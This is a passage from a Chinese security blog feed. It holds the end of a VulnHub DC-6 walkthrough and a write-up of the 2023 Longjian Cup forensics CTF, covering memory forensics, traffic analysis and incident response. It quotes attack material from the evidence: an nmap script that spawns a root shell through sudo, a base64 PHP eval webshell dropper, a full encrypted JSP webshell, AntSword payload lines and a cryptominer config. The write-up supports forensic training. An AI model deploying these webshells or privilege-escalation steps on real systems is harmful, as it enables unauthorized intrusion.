–script参数执行脚本</p><pre><code class="bash">echo &#39;os.execute(&quot;/bin/bash&quot;)&#39; &gt; 1.nse # nse是nmao插件扩展名sudo nmap --script=/home/jens/1.useid</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282120403.png" alt="image-20240228212018376"></p><pre><code>cd /rootcat theflag.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282120269.png" alt="image-20240228212047220"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-6渗透完毕</p><pre><code>wpscan爆破密码activity monitor插件漏洞nmap提权</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-6&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-6&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-6&quot;&gt;&lt;/a&gt;vulnhub靶场DC-6&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2023陇剑杯</title>
    <link href="http://w3nx1z1.github.io/2024/02/27/2023%E9%99%87%E5%89%91%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/02/27/2023%E9%99%87%E5%89%91%E6%9D%AF/</id>
    <published>2024-02-27T13:29:27.717Z</published>
    <updated>2024-02-28T07:10:13.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023陇剑杯初赛"><a href="#2023陇剑杯初赛" class="headerlink" title="2023陇剑杯初赛"></a>2023陇剑杯初赛</h1><pre><code>陇剑杯初赛的时候正好赶上我在带训 实在不好请假 遗憾错过流量分析杯 遂来复现一手</code></pre><h2 id="baby-forensics"><a href="#baby-forensics" class="headerlink" title="baby_forensics"></a>baby_forensics</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040033023.png" alt="image-20240204003301941"></p><p>要key  直接找关于key的文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 filescan | findstr &quot;key&quot;.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003df94070 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a</code></pre><p>导出来 重新命名为key.txt 内容是</p><pre><code>E96&lt;6J:Da6g_b_f_gd75a3d4ch4heg4bab66ad5d     </code></pre><p>估计还得在操作  随波逐流梭了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040052245.png" alt="image-20240204005247186"></p><pre><code>thekeyis2e80307085fd2b5c49c968c323ee25d5</code></pre><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040053671.png" alt="image-20240204005326608"></p><p>要计算机就提取计算器的进程</p><p>积累一下 计算器在计算机中的进程是<code>calc.exe</code></p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 pslist</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040055638.png" alt="image-20240204005552594"></p><p>导出来保存为data文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 memdump -p 2844 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a</code></pre><p>将1.data放到kali的gimp里面查看图像 需要调一下高度、宽度和偏移值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040112762.png" alt="image-20240204011216677"></p><p>得到计算器中的数字</p><pre><code>7598632541</code></pre><p>看wp还学到了一种做法 我们使用vol2的windows插件 并将其另存为<code>windows</code>文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 windows &gt;windows</code></pre><p>在这个文件里面直接翻 计算器的进程<code>calc.exe</code> 直接找到计算器的运行结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402102309685.png" alt="image-20240210230950647"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127039.png" alt="image-20240204120242491"></p><p>在使用r-studio翻找关键文件的时候 在Music文件夹找到一个<code>i4ak3y</code>文件 打开查看内容 应该是一个解密密钥</p><pre><code>qwerasdf</code></pre><p>这道题我们需要用到计算机中便签的进程 也就是<code>StikyNot.exe</code></p><pre><code>StikyNot.exe 是Windows操作系统中的一个应用程序，也就是桌面上的便签小工具。它的主要作用是提供一个简单的方式来创建、编辑和管理便签，以便用户可以在桌面上快速记录和查看重要的信息、提醒事项或备忘录。关于StikyNot.exe 的内存的作用，它主要用于存储和管理用户创建的便签内容。当用户打开StikyNot.exe 应用程序时，操作系统会为该程序分配一定的内存空间，用于存储便签的文本、颜色、位置等信息。这样，当用户关闭应用程序或重新启动计算机时，便签的内容仍然可以被保存下来，以便下次使用时能够恢复之前的状态。总结来说，StikyNot.exe 的内存的作用是为了存储和管理用户创建的便签内容，确保便签信息的持久性和可恢复性。</code></pre><p>找到StikyNot.exe进程并将其提取出来 PID是2968</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111603493.png" alt="image-20240211160329431"></p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 memdump -p 2968 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a</code></pre><p>将后缀改为data  使用gimp打开 调一下宽高</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111620937.png" alt="image-20240211162030868"></p><p>看到一串字符</p><pre><code>U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA==</code></pre><p>看到<code>U2Fsd</code>的头 想到很多使用对称加密在线网站的结果都有这个头 在结合上面找到的密码 直接进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111652856.png" alt="image-20240211165231813"></p><p>也可以直接在内存文件里面翻 有<code>U2Fsd</code>头的内容进行解密 但是多少还是有点草率</p><p>也可以写个check函数帮助筛选内存文件中可能是flag的内容 参考下面文章</p><p><a href="https://blog.csdn.net/Ahi0upsec/article/details/132549714?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170757131916800184120961%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170757131916800184120961&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-132549714-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=2023%E9%99%87%E5%89%91%E6%9D%AF&spm=1018.2226.3001.4187">2023陇剑杯wp</a></p><pre><code class="bash">#!/bin/bashcheck() &#123;    pattern=&quot;flag|==|10210897103|666c6167|464C4147|Zmxh|Wm14aFoz|&amp;#102|58s4vb|2uk2h3|key|pass|pwd|password|hint|U2FsdGVkX1&quot;    &gt; check.txt  # 清空或创建 check.txt 文件    grep -irlE &quot;$pattern&quot; 1.raw | while read -r file; do        echo -e &quot;File: $file&quot; &gt;&gt; check.txt        strings &quot;$file&quot; | grep -iE &quot;$pattern&quot; &gt;&gt; check.txt        echo -e &quot;&quot; &gt;&gt; check.txt    done&#125;check  # 调用 check 函数echo &quot;检查完成，请查看 check.txt 文件&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111713412.png" alt="image-20240211171337367"></p><h2 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111716058.png" alt="image-20240211171631986"></p><p>看了一下分组计数器 4xx很多 说明还是存在目录扫描的 我的思路还是先从响应码200的请求包开始找  先筛选一下</p><pre><code>http.response.code == 200</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111753613.png" alt="image-20240211175345527"></p><p>不是很多 从上到下翻找一下 第三个包找到了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111758514.png" alt="image-20240211175852466"></p><pre><code>a=file_put_contents%28%27d00r.php%27%2C+base64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg%3D%3D%27%29%29%3B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111759380.png" alt="image-20240211175932288"></p><p>到这可能觉得<code>d00r.php</code>就是正确答案了 但是在比赛的时候提交是不正确的 那就在往上一级找一下  那就是<code>ViewMore.php</code></p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111801971.png" alt="image-20240211180120905"></p><p>在上一题后面继续往后翻 看到使用了ifconfig命令  这个包是第10098流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402120009624.png" alt="image-20240212000917581"></p><p>在追踪一下http流 看一下获取ip地址的结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122241297.png" alt="image-20240212224132249"></p><p>上面的192.168.160.130是已经出现的 那下面的192.168.160.132就是服务器ip了</p><pre><code>192.168.160.132</code></pre><h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111805362.png" alt="image-20240211180507299"></p><p>还是一样在http流里面看 先看到读取了passwd文件的内容 <code>7e03864b0db7e6f9</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122309057.png" alt="image-20240212230949011"></p><p>还找到写入了一个base64编码的文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122159971.png" alt="image-20240212215923913"></p><p>是个压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122317638.png" alt="image-20240212231726573"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127100.png" alt="image-20240212231740914"></p><p>将压缩包保存下来  尝试使用上面读取的密码解压 得到key.txt</p><pre><code>7d9ddff2-2d67-4eba-9e48-b91c26c42337</code></pre><h2 id="hacked"><a href="#hacked" class="headerlink" title="hacked"></a>hacked</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127575.png" alt="image-20240212232426112"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132329684.png" alt="image-20240213232909590"></p><p> 追踪register页面可以找到加密算法</p><pre><code class="javascript">  &lt;script language=&quot;javascript&quot;&gt;    crypt_key = &#39;l36DoqKUYQP0N7e1&#39;;  crypt_iv = &#39;131b0c8a7a6e072e&#39;;  var key = CryptoJS.enc.Utf8.parse(crypt_key);   var iv = CryptoJS.enc.Utf8.parse(crypt_iv);   function Encrypt(word)&#123;    srcs = CryptoJS.enc.Utf8.parse(word);    var encrypted = CryptoJS.AES.encrypt(srcs, key, &#123; iv: iv,mode:CryptoJS.mode.CBC,padding: CryptoJS.pad.Pkcs7&#125;);    return encrypted.toString();  &#125;  function print()&#123;    var a = Encrypt(myform.username.value);    var b = Encrypt(myform.password.value);    &#125;</code></pre><p>写个解密脚本</p><pre><code class="python">from Crypto.Cipher import AESimport base64crypt_key = b&#39;l36DoqKUYQP0N7e1&#39;crypt_iv = b&#39;131b0c8a7a6e072e&#39;def decrypt(ciphertext):    cipher = AES.new(crypt_key, AES.MODE_CBC, crypt_iv)    decrypted = cipher.decrypt(base64.b64decode(ciphertext))    # 移除 PKCS7 填充    decrypted = _remove_pkcs7_padding(decrypted)    return decrypted.decode(&#39;utf-8&#39;)def _remove_pkcs7_padding(data):    padding_len = data[-1]    return data[:-padding_len]# 解密用户名和密码encrypted_username = &quot;pl3HJGsgs1Zn43qjV5Qx8w==&quot;decrypted_username = decrypt(encrypted_username)print(&#39;Decrypted Username:&#39;, decrypted_username)encrypted_password = &quot;pl3HJGsgs1Zn43qjV5Qx8w==&quot;decrypted_password = decrypt(encrypted_password)print(&#39;Decrypted Password:&#39;, decrypted_password)</code></pre><p>用上面这组用户名和密码 解出来为<code>aaa/aaa</code> 我们同样追踪register页面 找到admIn的那一组就好</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132345081.png" alt="image-20240213234532033"></p><pre><code>flag&#123;WelC0m5_TO_H3re&#125;</code></pre><h3 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132333038.png" alt="image-20240213233302974"></p><p>第68个流看到一串很奇妙的字符 直接搜索SECRET_KEY </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132347439.png" alt="image-20240213234748388"></p><p>解码一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132347671.png" alt="image-20240213234759606"></p><pre><code>ssti_flask_hsfvaldb</code></pre><h3 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132348796.png" alt="image-20240213234820734"></p><p>是flask的session注入漏洞 需要用到<code>flask-session-cookie-manager</code>这个工具来解密session</p><p>用法就是</p><pre><code>python3 ./flask_session_cookie_manager.py -c cookie密文 -s 密钥</code></pre><p>然后在流量包里面解密session值就可以了 密钥就是上面第二题<code>ssti_flask_hsfvaldb</code></p><p>我们直接看回显 像这种正常在页面上回显的基本上没有什么问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182049988.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182050900.png"></p><p>直接找有问题的 一个没有回显 一个回显None</p><p>![(<a href="https://raw.githubusercontent.com/w3n1z1/blogimage/main/image/202402182139955.png">https://raw.githubusercontent.com/w3n1z1/blogimage/main/image/202402182139955.png</a>)</p><p>求包看到了执行了whoami命令 返回包看到用户是red</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182140952.png" alt="image-20240218214056815"></p><p>因此 flask网站是由<code>red</code>用户启动的</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182141484.png" alt="image-20240218214151413"></p><p>一共就那么几个路由 都试试就出了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182149897.png" alt="image-20240218214937822"></p><pre><code>Index</code></pre><h2 id="hard-web"><a href="#hard-web" class="headerlink" title="hard_web"></a>hard_web</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182150196.png" alt="image-20240218215039122"></p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>看到这种找服务器开放端口的题 其实原理问的就是tcp三次握手 开放了端口肯定存在返回的ACK标志 那便需要我们找ACK标志</p><p>先判断服务器的ip地址  这个很好判断就是<code>192.168.162.180</code></p><p>使用tcpdump </p><pre><code>tcpdump -n -r /home/kali/Desktop/hard_web.pcap &#39;tcp[13] =18&#39; | awk &#39;&#123;print $3&#125;&#39; | sort -u </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182347584.png" alt="image-20240218234755533"></p><p>前三个就是 那么开放的端口就是<code>80 888 8888 </code></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>也可以直接在wireshark里面进行筛选 条件语句可以这样写</p><pre><code>tcp.connection.synack and ip.dst==192.168.162.188</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182349623.png" alt="image-20240218234944540"></p><h3 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182350454.png" alt="image-20240218235010397"></p><p>在传入jsp脚本之后 第一次进行命令执行的包处 追踪http流 找到key加密的过程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128052.png" alt="image-20240219171505923"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191752400.png" alt="image-20240219175250365"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402190014668.png" alt="image-20240219001430628"></p><pre><code class="javascript">&lt;%! String xc=&quot;748007e861908c03&quot;; class X extends ClassLoader&#123;    public X(ClassLoader z)&#123;        super(z);    &#125;public Class Q(byte[] cb)&#123;        return super.defineClass(cb, 0, cb.length);    &#125; &#125;public byte[] x(byte[] s,boolean m)&#123;     try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);        c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));        return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;%&gt;&lt;%try&#123;    byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];    java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);    if (session.getAttribute(&quot;payload&quot;)==null)&#123;        session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));    &#125;else&#123;        request.setAttribute(&quot;parameters&quot;, data);        Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();        java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();        f.equals(arrOut);        f.equals(pageContext);        f.toString();        response.getOutputStream().write(x(arrOut.toByteArray(), true));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</code></pre><p>可以看到有gunzip和aes aes加密的key也给了<code>748007e861908c03</code>   找到最后一个jsp加密流量 将密文以hex的形式转储</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191756710.png" alt="image-20240219175653599"></p><p>用厨子进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191757521.png" alt="image-20240219175752452"></p><h3 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191758211.png" alt="image-20240219175813153"></p><p>直接将aes的解密密钥解md5即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191806589.png" alt="image-20240219180602528"></p><pre><code>14mk3y</code></pre><h2 id="IncidentResponse"><a href="#IncidentResponse" class="headerlink" title="IncidentResponse"></a>IncidentResponse</h2><h3 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191807183.png" alt="image-20240219180755108"></p><p>首先对服务器进行挂载仿真</p><p>题目中给出了登陆服务器的账号密码<code>root/IncidentResponsePasswd</code> 直接登陆root账户 </p><p>这里我想的是先连上xshell 通过xftp将服务器中的文件下载下来 在使用D盾河马等工具进行扫描</p><p>在对服务器进行仿真挂载之后 选择NAT模式 使用ifconfig查看ip地址 会发现没有ens33网卡</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262041803.png" alt="image-20240226204115751"></p><p>找到一篇解决问题的文章<a href="https://blog.csdn.net/weixin_44365415/article/details/130108868?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170893659616800186546943%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170893659616800186546943&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-130108868-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B2%A1%E6%9C%89ens33&spm=1018.2226.3001.4187">【ubuntu虚拟机】ens33未出现在ifconfig问题</a></p><pre><code>ifconfig ens33 updhclient ens33ifconfig</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262042502.png" alt="image-20240226204253452"></p><p>得到ip地址<code>192.168.160.158</code>  当然虚拟机的网络连接模式要选NAT模式 </p><p>xshell连接成功 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262045691.png" alt="image-20240226204537637"></p><p>使用xftp将文件系统中的文件全部下载下来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262046088.png" alt="image-20240226204652002"></p><p>然后使用D盾进行扫描 </p><pre><code>\etc\redis\redis-server</code></pre><p>这个文件里面存在后门 看一下文件结构 还是个linux可执行程序 那这个就是挖矿病毒的路径了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262119503.png" alt="image-20240226211924453"></p><p>进行md5加密</p><pre><code>6f72038a870f05cbf923633066e48881</code></pre><h3 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271248631.png" alt="image-20240227124816577"></p><p>由第一题 我们可得挖矿病毒程序在<code>\etc\redis</code>文件夹下 那在同文件夹下一定还有关于挖矿病毒的文件</p><p>找到<code>redis.conf</code>配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271251198.png" alt="image-20240227125129155"></p><pre><code>这段代码看起来是关于加密货币挖矿的配置信息，可能是针对 XMRig 软件的配置。让我逐一解释：&quot;pools&quot;: [...]: 这是一个列表，包含了挖矿池的配置信息。&quot;algo&quot;: null: 这里应该指定挖矿所使用的算法，但是目前是空值，可能需要根据具体情况填写。&quot;coin&quot;: null: 指定挖矿的加密货币种类，同样是空值。&quot;url&quot;: &quot;donate.v2.xmrig.com:3333&quot;: 挖矿池的地址，通常包括主机名和端口号。&quot;user&quot;: &quot;YOUR_WALLET_ADDRESS&quot;: 这里需要填写你的数字货币钱包地址，挖矿所得的货币会发送到这个地址。&quot;pass&quot;: &quot;x&quot;: 密码，通常是 &#39;x&#39; 或者是空值。&quot;rig-id&quot;: null: 矿机的标识符，同样是空值。&quot;nicehash&quot;: false: 表示是否使用 NiceHash 挖矿，这里是 false，即不使用 NiceHash。&quot;keepalive&quot;: false: 是否保持挖矿连接活跃，这里是 false。&quot;enabled&quot;: true: 挖矿池是否启用，这里是 true。&quot;tls&quot;: false: 是否使用 TLS/SSL 连接，这里是 false。&quot;tls-fingerprint&quot;: null: TLS/SSL 指纹，同样是空值。&quot;daemon&quot;: false: 是否使用挖矿守护进程模式，这里是 false。&quot;socks5&quot;: null: SOCKS5 代理，同样是空值。&quot;self-select&quot;: null: 自选功能，为空值。&quot;submit-to-origin&quot;: false: 是否将挖矿结果提交到原始地址，这里是 false。</code></pre><p>很明显矿池域名是</p><pre><code>donate.v2.xmrig.com</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271300313.png" alt="image-20240227130018273"></p><pre><code>3fca20bb92d0ed67714e68704a0a4503</code></pre><h3 id="3-4"><a href="#3-4" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271300548.png" alt="image-20240227130039488"></p><p>查看服务器的历史命令</p><p>看到运行jar包之后生成了一个<code>nohup.log</code>日志文件 在<code>\home\app</code>文件夹下 在里面看到了很多shiro链 那就是shiro反序列化漏洞</p><pre><code>shirodeserialization3ee726cb32f87a15d22fe55fa04c4dcd</code></pre><h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271833436.png" alt="image-20240227183332371"></p><p>直接用last命令看一下登陆记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271835827.png" alt="image-20240227183517764"></p><p>这几个就是</p><pre><code>81.70.166.3c76b4b1a5e8c9e7751af4684c6a8b2c9</code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271835095.png" alt="image-20240227183555028"></p><p>查看nginx服务器的日志文件 </p><pre><code>cat \var\log\nginx\access.log</code></pre><p>直接拉到最后</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271858068.png" alt="image-20240227185804997"></p><pre><code>Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)mozilla/5.0(compatible;baiduspider/2.0;+http://www.baidu.com/search/spider.html)6ba8458f11f4044cce7a621c085bb3c6</code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271901846.png" alt="image-20240227190112787"></p><p>猜测是sshd软连接</p><p>直接搜一下</p><pre><code>history | grep ssh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271908952.png" alt="image-20240227190834907"></p><p>查看这个文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271909843.png" alt="image-20240227190903805"></p><p>UsePAM为YES的话就是通过ssh软连接进行权限维持</p><p>再看一下ssh</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271911412.png" alt="image-20240227191140366"></p><p>连接上了kali的ssh</p><pre><code>/root/.ssh/authorized_keysa1fa1b5aeb1f97340032971c342c4258</code></pre><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271912351.png" alt="image-20240227191218301"></p><p>上面提到的redis挖矿病毒也算 </p><pre><code>/lib/systemd/system/redis.service</code></pre><p>这个文件一直在开启redis文件进行自动挖矿</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271913573.png" alt="image-20240227191354528"></p><pre><code>b2c5af8ce08753894540331e5a947d35</code></pre><h2 id="SmallSword"><a href="#SmallSword" class="headerlink" title="SmallSword"></a>SmallSword</h2><h3 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402192341144.png" alt="image-20240219234130980"></p><p>找到蚁剑连接部分的流量  解一下url编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402201724005.png" alt="image-20240220172412934"></p><pre><code>6ea280898e404bfabd0ebb702327b19f</code></pre><p>看到<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0)</code> 这部分前面就是蚁剑连接的密码</p><pre><code>6ea280898e404bfabd0ebb702327b19f</code></pre><h3 id="2-5"><a href="#2-5" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202211103.png" alt="image-20240220221117025"></p><p>直接找蚁剑连接的流量包一个个解密看内容就行 这个没什么技巧</p><p>需要注意一点蚁剑流量在url编码之前会先进行一次base64加密 但是加密之后可能会在密文前添加不定字符 进行一个简单的免杀 这会使我们在解密的时候 如果不去掉这些额外字符解出来肯定会是乱码</p><p>这个冗余字符的长度我们可以观察蚁剑流量传输的代码 </p><p>下面是例子</p><pre><code>$p = base64_decode(substr($_POST[&quot;m0300de6257f67&quot;], 2));substr函数的作用是截取字符串中指定长度的字符语法是int substr(string str, int start , int length)   那么对于上面这一部分蚁剑流量 就可以理解为他从下标索引为2的字符(实际上就是第三个字符)开始截取 并进行base64解密</code></pre><p>那么对于这个流量 我们也可以找到相关的语句 发现他没有进行免杀 直接从头开始解base64</p><pre><code>$D=base64_decode($_POST[&quot;0x72b3f341e432&quot;]);</code></pre><p>解密142条流量包的数据 发现存在写入一个名为<code>hacker.txt</code>的文件的操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202333845.png" alt="image-20240220233301767"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202332884.png" alt="image-20240220233238792"></p><p>这部分就是攻击者留存的值</p><pre><code>ad6269b7-3ce2-4ae8-b97f-f259515e7a91 </code></pre><h3 id="3-5"><a href="#3-5" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202334167.png" alt="image-20240220233403097"></p><p>第130个数据包处进行解密 发现是读取了一个<code>huorong.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202354803.png" alt="image-20240220235426750"></p><p>同时导出http最大的文件也是这个包里面的 名为<code>info1.php</code> 